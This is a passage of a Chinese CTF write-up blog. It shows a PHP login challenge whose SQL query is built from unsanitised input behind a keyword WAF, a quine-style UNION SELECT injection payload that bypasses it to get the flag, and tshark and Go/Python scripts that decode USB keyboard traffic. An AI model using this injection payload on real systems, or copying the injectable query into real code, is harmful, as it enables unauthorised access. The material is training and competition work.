double-quoted-string">"/if|regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|insert|database|reverse|update|extractvalue|floor|join|substr|&amp;|;|\\\$|char|\x0a|\x09|column|sleep|\ /i"</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">alertMes</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'waf here'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">''</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'bilala'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">alertMes</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'only bilala can login'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">checkSql</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT passwd FROM users WHERE username='bilala' and passwd='<span class="token interpolation"><span class="token variable">$password</span></span>';"</span><span class="token punctuation">;</span>    <span class="token variable">$user_result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$user_result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$row</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">alertMes</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'nothing found'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'b2f2d15b3ae082ca29697d8dcd420fd7'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$FLAG</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">alertMes</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"wrong password"</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取 flag 的前提为用于登录的密码不为 b2f2d15b3ae082ca29697d8dcd420fd7</p><p>payload</p><pre class="line-numbers language-none"><code class="language-none">[POST]username=bilala&amp;passwd='/**/union/**/select/**/replace(replace('"/**/union/**/select/**/replace(replace(".",0x22,0x27),0x2e,".")#',0x22,0x27),0x2e,'"/**/union/**/select/**/replace(replace(".",0x22,0x27),0x2e,".")#')#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="1-破损的flag"><a href="#1-破损的flag" class="headerlink" title="1. 破损的flag"></a>1. 破损的flag</h3><p>#流量分析 #USB协议 #键盘流量 </p><ul><li>题目描述</li></ul><p>无</p><ul><li>题目解析</li></ul><p>usb键盘流量包，现将键盘流量全部提取出来</p><p>在 Wireshark 下执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tshark.exe <span class="token parameter variable">-T</span> fields <span class="token parameter variable">-r</span> usbdata.pcapng <span class="token parameter variable">-e</span> usb.capdata <span class="token operator">&gt;</span> usbdata.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>写个脚本跑一下</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"bufio"</span><span class="token string">"fmt"</span><span class="token string">"os"</span><span class="token string">"syscall"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>input<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">OpenFile</span><span class="token punctuation">(</span><span class="token string">"usbdata.txt"</span><span class="token punctuation">,</span> syscall<span class="token punctuation">.</span>O_RDONLY<span class="token punctuation">,</span> <span class="token number">0666</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span><span class="token keyword">return</span><span class="token punctuation">}</span><span class="token keyword">defer</span> input<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>reader <span class="token operator">:=</span> bufio<span class="token punctuation">.</span><span class="token function">NewReader</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span>normalKeys <span class="token operator">:=</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token string">"04"</span><span class="token punctuation">:</span> <span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span> <span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span> <span class="token string">"e"</span><span class="token punctuation">,</span> <span class="token string">"09"</span><span class="token punctuation">:</span> <span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span> <span class="token string">"g"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span> <span class="token string">"h"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span> <span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span> <span class="token string">"j"</span><span class="token punctuation">,</span> <span class="token string">"0e"</span><span class="token punctuation">:</span> <span class="token string">"k"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span> <span class="token string">"l"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span> <span class="token string">"m"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span> <span class="token string">"n"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span> <span class="token string">"o"</span><span class="token punctuation">,</span> <span class="token string">"13"</span><span class="token punctuation">:</span> <span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span> <span class="token string">"q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span> <span class="token string">"r"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span> <span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span> <span class="token string">"t"</span><span class="token punctuation">,</span> <span class="token string">"18"</span><span class="token punctuation">:</span> <span class="token string">"u"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span> <span class="token string">"v"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span> <span class="token string">"w"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span> <span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span> <span class="token string">"y"</span><span class="token punctuation">,</span> <span class="token string">"1d"</span><span class="token punctuation">:</span> <span class="token string">"z"</span><span class="token punctuation">,</span> <span class="token string">"1e"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span> <span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span> <span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span> <span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token string">"22"</span><span class="token punctuation">:</span> <span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span> <span class="token string">"6"</span><span class="token punctuation">,</span> <span class="token string">"24"</span><span class="token punctuation">:</span> <span class="token string">"7"</span><span class="token punctuation">,</span> <span class="token string">"25"</span><span class="token punctuation">:</span> <span class="token string">"8"</span><span class="token punctuation">,</span> <span class="token string">"26"</span><span class="token punctuation">:</span> <span class="token string">"9"</span><span class="token punctuation">,</span> <span class="token string">"27"</span><span class="token punctuation">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span> <span class="token string">"28"</span><span class="token punctuation">:</span> <span class="token string">"&lt;RET&gt;"</span><span class="token punctuation">,</span> <span class="token string">"29"</span><span class="token punctuation">:</span> <span class="token string">"&lt;ESC&gt;"</span><span class="token punctuation">,</span> <span class="token string">"2a"</span><span class="token punctuation">:</span> <span class="token string">"&lt;DEL&gt;"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span> <span class="token string">"\t"</span><span class="token punctuation">,</span> <span class="token string">"2c"</span><span class="token punctuation">:</span> <span class="token string">"&lt;SPACE&gt;"</span><span class="token punctuation">,</span> <span class="token string">"2d"</span><span class="token punctuation">:</span> <span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">"2e"</span><span class="token punctuation">:</span> <span class="token string">"="</span><span class="token punctuation">,</span> <span class="token string">"2f"</span><span class="token punctuation">:</span> <span class="token string">"["</span><span class="token punctuation">,</span> <span class="token string">"30"</span><span class="token punctuation">:</span> <span class="token string">"]"</span><span class="token punctuation">,</span> <span class="token string">"31"</span><span class="token punctuation">:</span> <span class="token string">"\\"</span><span class="token punctuation">,</span> <span class="token string">"32"</span><span class="token punctuation">:</span> <span class="token string">"&lt;NON&gt;"</span><span class="token punctuation">,</span> <span class="token string">"33"</span><span class="token punctuation">:</span> <span class="token string">";"</span><span class="token punctuation">,</span> <span class="token string">"34"</span><span class="token punctuation">:</span> <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">"35"</span><span class="token punctuation">:</span> <span class="token string">"&lt;GA&gt;"</span><span class="token punctuation">,</span> <span class="token string">"36"</span><span class="token punctuation">:</span> <span class="token string">","</span><span class="token punctuation">,</span> <span class="token string">"37"</span><span class="token punctuation">:</span> <span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">"38"</span><span class="token punctuation">:</span> <span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"39"</span><span class="token punctuation">:</span> <span class="token string">"&lt;CAP&gt;"</span><span class="token punctuation">,</span> <span class="token string">"3a"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F1&gt;"</span><span class="token punctuation">,</span> <span class="token string">"3b"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F2&gt;"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F3&gt;"</span><span class="token punctuation">,</span> <span class="token string">"3d"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F4&gt;"</span><span class="token punctuation">,</span> <span class="token string">"3e"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F5&gt;"</span><span class="token punctuation">,</span> <span class="token string">"3f"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F6&gt;"</span><span class="token punctuation">,</span> <span class="token string">"40"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F7&gt;"</span><span class="token punctuation">,</span> <span class="token string">"41"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F8&gt;"</span><span class="token punctuation">,</span> <span class="token string">"42"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F9&gt;"</span><span class="token punctuation">,</span> <span class="token string">"43"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F10&gt;"</span><span class="token punctuation">,</span> <span class="token string">"44"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F11&gt;"</span><span class="token punctuation">,</span> <span class="token string">"45"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F12&gt;"</span><span class="token punctuation">}</span>shiftKeys <span class="token operator">:=</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token string">"04"</span><span class="token punctuation">:</span> <span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span> <span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span> <span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span> <span class="token string">"D"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span> <span class="token string">"E"</span><span class="token punctuation">,</span> <span class="token string">"09"</span><span class="token punctuation">:</span> <span class="token string">"F"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span> <span class="token string">"G"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span> <span class="token string">"H"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span> <span class="token string">"I"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span> <span class="token string">"J"</span><span class="token punctuation">,</span> <span class="token string">"0e"</span><span class="token punctuation">:</span> <span class="token string">"K"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span> <span class="token string">"L"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span> <span class="token string">"M"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span> <span class="token string">"N"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span> <span class="token string">"O"</span><span class="token punctuation">,</span> <span class="token string">"13"</span><span class="token punctuation">:</span> <span class="token string">"P"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span> <span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span> <span class="token string">"R"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span> <span class="token string">"S"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span> <span class="token string">"T"</span><span class="token punctuation">,</span> <span class="token string">"18"</span><span class="token punctuation">:</span> <span class="token string">"U"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span> <span class="token string">"V"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span> <span class="token string">"W"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span> <span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span> <span class="token string">"Y"</span><span class="token punctuation">,</span> <span class="token string">"1d"</span><span class="token punctuation">:</span> <span class="token string">"Z"</span><span class="token punctuation">,</span> <span class="token string">"1e"</span><span class="token punctuation">:</span> <span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span> <span class="token string">"@"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span> <span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span> <span class="token string">"$"</span><span class="token punctuation">,</span> <span class="token string">"22"</span><span class="token punctuation">:</span> <span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span> <span class="token string">"^"</span><span class="token punctuation">,</span> <span class="token string">"24"</span><span class="token punctuation">:</span> <span class="token string">"&amp;"</span><span class="token punctuation">,</span> <span class="token string">"25"</span><span class="token punctuation">:</span> <span class="token string">"*"</span><span class="token punctuation">,</span> <span class="token string">"26"</span><span class="token punctuation">:</span> <span class="token string">"("</span><span class="token punctuation">,</span> <span class="token string">"27"</span><span class="token punctuation">:</span> <span class="token string">")"</span><span class="token punctuation">,</span> <span class="token string">"28"</span><span class="token punctuation">:</span> <span class="token string">"&lt;RET&gt;"</span><span class="token punctuation">,</span> <span class="token string">"29"</span><span class="token punctuation">:</span> <span class="token string">"&lt;ESC&gt;"</span><span class="token punctuation">,</span> <span class="token string">"2a"</span><span class="token punctuation">:</span> <span class="token string">"&lt;DEL&gt;"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span> <span class="token string">"\t"</span><span class="token punctuation">,</span> <span class="token string">"2c"</span><span class="token punctuation">:</span> <span class="token string">"&lt;SPACE&gt;"</span><span class="token punctuation">,</span> <span class="token string">"2d"</span><span class="token punctuation">:</span> <span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token string">"2e"</span><span class="token punctuation">:</span> <span class="token string">"+"</span><span class="token punctuation">,</span> <span class="token string">"2f"</span><span class="token punctuation">:</span> <span class="token string">"{"</span><span class="token punctuation">,</span> <span class="token string">"30"</span><span class="token punctuation">:</span> <span class="token string">"}"</span><span class="token punctuation">,</span> <span class="token string">"31"</span><span class="token punctuation">:</span> <span class="token string">"|"</span><span class="token punctuation">,</span> <span class="token string">"32"</span><span class="token punctuation">:</span> <span class="token string">"&lt;NON&gt;"</span><span class="token punctuation">,</span> <span class="token string">"33"</span><span class="token punctuation">:</span> <span class="token string">"\""</span><span class="token punctuation">,</span> <span class="token string">"34"</span><span class="token punctuation">:</span> <span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">"35"</span><span class="token punctuation">:</span> <span class="token string">"&lt;GA&gt;"</span><span class="token punctuation">,</span> <span class="token string">"36"</span><span class="token punctuation">:</span> <span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token string">"37"</span><span class="token punctuation">:</span> <span class="token string">"&gt;"</span><span class="token punctuation">,</span> <span class="token string">"38"</span><span class="token punctuation">:</span> <span class="token string">"?"</span><span class="token punctuation">,</span> <span class="token string">"39"</span><span class="token punctuation">:</span> <span class="token string">"&lt;CAP&gt;"</span><span class="token punctuation">,</span> <span class="token string">"3a"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F1&gt;"</span><span class="token punctuation">,</span> <span class="token string">"3b"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F2&gt;"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F3&gt;"</span><span class="token punctuation">,</span> <span class="token string">"3d"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F4&gt;"</span><span class="token punctuation">,</span> <span class="token string">"3e"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F5&gt;"</span><span class="token punctuation">,</span> <span class="token string">"3f"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F6&gt;"</span><span class="token punctuation">,</span> <span class="token string">"40"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F7&gt;"</span><span class="token punctuation">,</span> <span class="token string">"41"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F8&gt;"</span><span class="token punctuation">,</span> <span class="token string">"42"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F9&gt;"</span><span class="token punctuation">,</span> <span class="token string">"43"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F10&gt;"</span><span class="token punctuation">,</span> <span class="token string">"44"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F11&gt;"</span><span class="token punctuation">,</span> <span class="token string">"45"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F12&gt;"</span><span class="token punctuation">}</span><span class="token keyword">for</span> <span class="token boolean">true</span> <span class="token punctuation">{</span>line<span class="token punctuation">,</span> err <span class="token operator">:=</span> reader<span class="token punctuation">.</span><span class="token function">ReadString</span><span class="token punctuation">(</span><span class="token char">'\n'</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span><span class="token keyword">return</span><span class="token punctuation">}</span><span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"00"</span> <span class="token punctuation">{</span>results <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span>normalKeys<span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> shiftKeys<span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'2'</span> <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span>results<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'0'</span> <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span>results<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个脚本相对来说还是比较简陋的</p><p>大佬给出的脚本，可以仿照修改一个</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">normalKeys <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"04"</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span><span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span><span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span><span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span><span class="token string">"e"</span><span class="token punctuation">,</span> <span class="token string">"09"</span><span class="token punctuation">:</span><span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span><span class="token string">"g"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span><span class="token string">"h"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span><span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span><span class="token string">"j"</span><span class="token punctuation">,</span> <span class="token string">"0e"</span><span class="token punctuation">:</span><span class="token string">"k"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span><span class="token string">"l"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span><span class="token string">"m"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span><span class="token string">"n"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span><span class="token string">"o"</span><span class="token punctuation">,</span> <span class="token string">"13"</span><span class="token punctuation">:</span><span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span><span class="token string">"q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span><span class="token string">"r"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span><span class="token string">"t"</span><span class="token punctuation">,</span> <span class="token string">"18"</span><span class="token punctuation">:</span><span class="token string">"u"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span><span class="token string">"v"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span><span class="token string">"w"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span><span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span><span class="token string">"y"</span><span class="token punctuation">,</span> <span class="token string">"1d"</span><span class="token punctuation">:</span><span class="token string">"z"</span><span class="token punctuation">,</span><span class="token string">"1e"</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span><span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span><span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span><span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token string">"22"</span><span class="token punctuation">:</span><span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span><span class="token string">"6"</span><span class="token punctuation">,</span><span class="token string">"24"</span><span class="token punctuation">:</span><span class="token string">"7"</span><span class="token punctuation">,</span><span class="token string">"25"</span><span class="token punctuation">:</span><span class="token string">"8"</span><span class="token punctuation">,</span><span class="token string">"26"</span><span class="token punctuation">:</span><span class="token string">"9"</span><span class="token punctuation">,</span><span class="token string">"27"</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">,</span><span class="token string">"28"</span><span class="token punctuation">:</span><span class="token string">"&lt;RET&gt;"</span><span class="token punctuation">,</span><span class="token string">"29"</span><span class="token punctuation">:</span><span class="token string">"&lt;ESC&gt;"</span><span class="token punctuation">,</span><span class="token string">"2a"</span><span class="token punctuation">:</span><span class="token string">"&lt;DEL&gt;"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span><span class="token string">"\t"</span><span class="token punctuation">,</span><span class="token string">"2c"</span><span class="token punctuation">:</span><span class="token string">"&lt;SPACE&gt;"</span><span class="token punctuation">,</span><span class="token string">"2d"</span><span class="token punctuation">:</span><span class="token string">"-"</span><span class="token punctuation">,</span><span class="token string">"2e"</span><span class="token punctuation">:</span><span class="token string">"="</span><span class="token punctuation">,</span><span class="token string">"2f"</span><span class="token punctuation">:</span><span class="token string">"["</span><span class="token punctuation">,</span><span class="token string">"30"</span><span class="token punctuation">:</span><span class="token string">"]"</span><span 